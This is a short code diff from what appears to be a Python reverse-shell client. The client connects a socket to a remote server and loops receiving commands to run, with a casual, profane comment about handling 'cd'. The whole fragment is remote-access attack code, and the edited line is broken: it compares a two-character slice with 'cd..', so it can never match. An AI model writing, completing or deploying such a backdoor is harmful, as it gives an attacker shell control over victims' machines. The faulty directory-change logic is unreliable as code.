@@ -9,7 +9,7 @@ s.connect((host, port))#connects to ur server innit
 
 while True:
     data = s.recv(1024)
-    if data[:2].decode('utf-8') == 'cd':
+    if data[:2].decode('utf-8') == 'cd..':
         os.chdir(data[:3].decode('utf-8'))
         #this shit is for cd so it doesnt fucking die lol
     if len(data) > 0:
